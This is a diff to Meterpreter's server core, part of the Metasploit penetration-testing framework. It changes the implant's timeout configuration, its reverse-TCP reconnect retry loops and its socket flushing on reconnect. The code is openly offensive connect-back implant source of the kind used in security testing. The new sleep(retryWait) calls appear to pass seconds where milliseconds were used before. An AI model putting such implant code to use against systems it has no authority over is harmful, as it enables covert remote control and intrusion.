@@ -17,7 +17,7 @@ MetsrvConfigData global_config =
 	.proxy_username = "METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
 	.proxy_password = "METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
 	.ssl_cert_hash = "METERPRETER_SSL_CERT_HASH\x00\x00\x00",
-	.timeouts.placeholder = "METERP_TIMEOUTS\x00"
+	.timeouts.values = { .expiry = 24*3600*7, .comms = 300, .retry_total = 3600, .retry_wait = 10 }
 };
 
 #define SetHandleInformation(a, b, c)
@@ -40,6 +40,7 @@ static DWORD reverse_tcp_run(SOCKET reverseSocket, struct sockaddr* sockAddr, in
 {
 	DWORD result = ERROR_SUCCESS;
 	int start = current_unix_timestamp();
+
 	do
 	{
 		int retryStart = current_unix_timestamp();
@@ -55,11 +56,7 @@ static DWORD reverse_tcp_run(SOCKET reverseSocket, struct sockaddr* sockAddr, in
 		}
 
 		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
-		int waited = current_unix_timestamp() - retryStart;
-		if ((DWORD)waited < retryWait)
-		{
-			sleep((retryWait - (DWORD)waited) * 1000);
-		}
+		sleep(retryWait);
 	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);
 
 	if (result == SOCKET_ERROR)
@@ -168,11 +165,7 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 		}
 
 		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
-		int waited = current_unix_timestamp() - retryStart;
-		if ((DWORD)waited < retryWait)
-		{
-			sleep((retryWait - (DWORD)waited) * 1000);
-		}
+		sleep(retryWait);
 	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);
 
 	closesocket(socketHandle);
@@ -885,6 +878,15 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 
 	dprintf("[SERVER] Flushing the socket handle...");
 	server_socket_flush(remote);
+
+	// TODO: remove this when stageless stuff happens.
+	// if we've just "reconnected" then we're going to flush
+	// the socket a second time beacuse the second stage is
+	// coming down and we don't want it!
+	if (ctx->sock_desc_size > 0)
+	{
+		server_socket_flush(remote);
+	}
 
 	dprintf("[SERVER] Initializing SSL...");
 	if (server_initialize_ssl(remote))
